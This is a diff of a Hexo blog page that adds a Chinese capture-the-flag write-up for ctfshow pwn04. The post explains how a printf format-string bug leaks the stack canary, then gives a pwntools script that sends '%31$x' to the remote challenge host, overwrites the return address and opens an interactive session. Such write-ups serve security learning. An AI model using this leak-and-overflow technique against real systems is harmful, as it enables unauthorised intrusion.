@@ -115,7 +115,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -145,6 +145,86 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/" class="post-title-link" itemprop="url">格式化字符串泄露canary</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-04-02 19:19:30 / Modified: 19:36:55" itemprop="dateCreated datePublished" datetime="2022-04-02T19:19:30+08:00">2022-04-02</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="一道利用格式化字符串漏洞来绕过canary防护的题目"><a href="#一道利用格式化字符串漏洞来绕过canary防护的题目" class="headerlink" title="一道利用格式化字符串漏洞来绕过canary防护的题目"></a>一道利用格式化字符串漏洞来绕过canary防护的题目</h1><p>题目是ctfshow的pwn04，一道纯粹的利用printf漏洞来泄露出canary的题目<br>将题目checksec一下可以看到题目开了canary防护<br>反汇编代码：<br><img src="https://i.bmp.ovh/imgs/2022/04/02/3b77825375723419.png" alt="反汇编代码"><br>并且该题可以进行两次数据的写入，偏移为0x70+4<br><img src="https://i.bmp.ovh/imgs/2022/04/02/3cd07a5db0d46aec.png"></p>
+<p>从下面汇编代码可以知道，该题是将canary放在了ebp+0xC地址处<br><img src="https://s3.bmp.ovh/imgs/2022/04/02/7a86962c3018516b.png" alt="汇编"></p>
+<p>从下图看一看到canary的格式化字符串偏移为0x31<br><img src="https://i.bmp.ovh/imgs/2022/04/02/4c44243d682d4da9.png" alt="偏移"></p>
+<p>该题的exp如下:</p>
+<pre><code class="python">from pwn import *
+#io=process(&quot;./ex2&quot;)
+io=remote(&quot;pwn.challenge.ctf.show&quot;,28142)
+io.recv()
+leak_canary=b&#39;%31$x&#39;
+io.sendline(leak_canary)
+canary=int(io.recv(),16)
+print(hex(canary))
+payload=b&#39;A&#39;*100+p32(canary)+b&#39;A&#39;*12+p32(0x804859b)
+io.sendline(payload)
+io.interactive()
+</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
